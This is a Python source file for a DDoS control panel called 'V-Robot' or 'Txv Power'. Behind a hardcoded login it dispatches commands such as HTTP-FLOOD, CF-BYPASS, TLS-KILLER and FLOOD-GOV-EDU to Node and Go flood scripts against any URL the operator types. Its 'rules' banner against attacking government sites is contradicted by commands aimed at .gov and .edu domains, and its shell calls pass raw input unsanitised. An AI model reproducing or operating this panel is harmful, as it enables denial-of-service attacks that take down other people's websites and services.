import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
╦  ╦  ╦═╗╔═╗╔╗ ╔═╗
╚╗╔╝  ╠╦╝║ ║╠╩╗║ ║
 ╚╝   ╩╚═╚═╝╚═╝╚═╝          
    ''')
    

def si():
    print('         \x1b[38;5;160m[ \x1b[38;2;233;233;233mV-Robot Power \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to Txv Panel! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: Txvdzai208 \x1b[38;5;160m| \x1b[38;2;233;233;233mUpdate v1')
    print("")

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;5;160m╔═══════════════╗
                                \x1b[38;5;160m║     \x1b[38;5;160mRules     \x1b[38;5;160m║
                \x1b[38;5;160m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;160m║ \x1b[38;5;160m1. Do not attack without someone's permission \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m3. Do not spam attacks                        \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m4. Only attack stress testing servers         \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m5. Don't skid the panel                       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m6. Give a star to the github repository       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m7. The creator does not do any harm           \x1b[38;5;160m║
                \x1b[38;5;160m╚═══════════════════════════════════════════════╝
''')

def layer7():
    clear()
    si()
    print(f'''
\033[1;32m╦  ╦  ╦═╗╔═╗╔╗ ╔═╗╔╦╗  ╔═╗╔═╗╦ ╦╔═╗╦═╗┬
\033[1;35m╚╗╔╝  ╠╦╝║ ║╠╩╗║ ║ ║   ╠═╝║ ║║║║║╣ ╠╦╝  │
 \033[1;32m╚╝   ╩╚═╚═╝╚═╝╚═╝ ╩   ╩  ╚═╝╚╩╝╚═╝╩╚═  o
               
               \x1b[255;255;0m ===> NO SPAM ATTACK OKAY ? :)     
               ''')

def menu():
    sys.stdout.write(f"         \x1b]V-Robot Power | Online | CONNS 100 | USERS Txvadminbot \x08")
    clear()
    print('\x1b[38;5;160m[ \x1b[38;2;233;233;233mTxv Power \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to , Txv Power! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: Txvdzaicuto \x1b[38;5;160m| \x1b[38;2;233;233;233mUpdate')
    print("")
    print("""
\x1b[38;5;160m - Hello , Bro 👋
\x1b[38;5;160m - WellCome To Panel My!!!
\x1b[38;5;160m - YOU AND PLAN ADMIN 
\x1b[38;5;160m - PANEL DDOS PLAN !
\x1b[38;5;160m - VIP NEW PROXY ! 

""")


def main():
    menu()
    while(True):
        cnc = input('''\033[1;33m╔══[V-\x1b[\x1b[38;5;160m@Ro\033[1;32m\033[1;32mbo\x1b[38;2;0;49;147m]
\x1b[38;5;160m╚\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m═\033[1;37m➤ \33[32;5;245m\33[1m\33[38;5;51m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        
        elif "HTTP-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-BYPASS.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-BYPASS <url> <time>')
                print('Example: HTTP-BYPASS http://nxtxnxx.com 60')

        elif "CF-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node CF-BYPASS.js {url} {time} {threads}')
            except IndexError:
                print('Usage: CF-BYPASS <url> <time> <threads>')
                print('Example: CF-BYPASS http://NXTXNXX.COM 60 200')

        elif "BROWSER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node BROWSER.js {url} {time} {req_per_ip} proxies.txt')
            except IndexError:
                print('Usage: BROWSER <url> <time> <req_per_ip> <proxies>')
                print('Example: BROWSER http://XNXX 60 100')

        elif "HTTP-RAW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                method = cnc.split()[3]
                os.system(f'node HTTP-RAW.js {url} {time} {method}')
            except IndexError:
                print('Usage: HTTP-RAW <url> <time> <GET/POST/HEAD>')
                print('Example: HTTP-RAW http://NXTXNXX 60 POST')

        elif "HTTP-RAND" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-RAND <url> <time>')
                print('Example: HTTP-RAND http://XNXX 120')

        elif "HTTP-GOV" in cnc:
            try:
                url = cnc.split()[1]
                req_per_ip = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-GOV.js {url} {req_per_ip} {time}')
            except IndexError:
                print('Usage: HTTP-GOV <url> <req_per_ip> <time>')
                print('Example: HTTP-GOV http://nxtxnxx 100 60')

        elif "HTTP-FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-FLOOD.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-FLOOD <url> <time>')
                print('Example: HTTP-FLOOD http://example.com 60')

        elif "HULKING" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: HULKING -site <url> -data <GET>')
                print('Example: HULKING -site http://example.com -data GET')
        elif "HTTP-TLS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-TLS.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-TLS <url> <time>')
                print('Example: HTTP-TLS http://example.com 60 64')
        elif "HTTP-TLSv2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node HTTP-TLSv2.js {url} {time} {req_per_ip}')
            except IndexError:
                print('Usage: HTTP-TLSv2 <url> <time> <req_per_ip>')
                print('Example: HTTP-TLS http://example.com 60 64')
        elif "NXT-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node CF-BYPASSv2.js {url} {time}')
            except IndexError:
                print('Usage: NXT-BYPASS <url> <time>')
                print('Example: NXT-BYPASS http://example.com 60')
        elif "NXT-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node CF-BYPASSv2.js {url} {time}')
            except IndexError:
                print('Usage: NXT-BYPASS <url> <time>')
                print('Example: NXT-BYPASS http://example.com 60')
        elif "TLS-KILLER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                proxy = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node HTTP-BYPASSv2.js {url} {time} {proxy} {threads}')
            except IndexError:
                print('Usage: TLS-KILLER <URL> <Time> <proxy.txt> <Threads>')
                print('Example: TLS-KILLER https://example.com 60 proxy.txt 5')
        elif "HTTP-MIX" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-MIX.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-MIX <url> <time>')
                print('Example: HTTP-MIX http://example.com 60')
        elif "HTTP-DESTROY" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-MIXv2.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-DESTROY <url> <time>')
                print('Example: HTTP-DESTROY http://example.com 60')
        elif "HTTP-LOAD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node HTTP-LOAD.js {url} {time} {threads}')
            except IndexError:
                print('Usage: HTTP-LOAD <url> <time> <threads>')
                print('Example: HTTP-LOAD http://example.com 60 200')
        elif "VIP-NXT" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node VIP-NXT.js {url} {time}')
            except IndexError:
                print('Usage: VIP-NXT <url> <time> ')
                print('Example: VIP-NXT http://example.com 60 ')
        elif "BYPASS-SITE" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                proxies = cnc.split()[4]
                os.system(f'node CF-UAM.js {url} {time} {req_per_ip} {proxies}')
            except IndexError:
                print('Usage: BYPASS-SITE <url> <time> <req_per_ip> <proxies>')
                print('Example: BYPASS-SITE <http://example.com> <60> <100> <http.txt>')
        elif "FLOOD-GOV-EDU" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node TEST.js {url} {time}')
            except IndexError:
                print('Usage: FLOOD-GOV-EDU <url> <time> ')
                print('Example: FLOOD-GOV-EDU http://example.com 60 ')

        elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
def login():
    clear()
    user = "xvuongiunanh"
    passwd = "xvuongiunanh"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("</> Invalid credentials! SHIT ?...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("</> Welcome to V-ROBOT !")
        time.sleep(0.3)
        ascii_vro()
        main()

login()



